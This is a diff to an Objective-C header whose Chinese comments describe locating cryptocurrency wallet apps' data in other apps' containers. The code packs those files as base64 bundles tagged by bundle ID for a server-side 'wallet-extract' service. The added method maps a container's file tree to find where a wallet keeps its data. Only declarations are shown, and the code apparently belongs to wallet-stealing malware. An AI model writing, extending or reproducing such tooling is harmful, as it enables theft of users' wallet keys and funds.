@@ -26,6 +26,14 @@
 + (NSArray<NSString *> *)listFilesIn:(NSString *)relDir container:(NSString *)bundleId;
 
 /**
+ * 递归列出容器里的文件树（诊断用：确定某个钱包把数据放在哪）
+ * @return @[ @"相对路径|大小", ... ]
+ */
++ (NSArray<NSString *> *)treeOfContainer:(NSString *)bundleId
+                                maxDepth:(NSInteger)maxDepth
+                              maxEntries:(NSInteger)maxEntries;
+
+/**
  * 按「采集项」收集一个 App 容器的文件，打成 path + base64 的包。
  * 条目名统一加 <bundleId>/ 前缀，服务端 wallet-extract 靠这个认钱包类型。
  * @return @{ @"files": @[@{@"p":...,@"d":base64}], @"bytes": @(N), @"error":... }
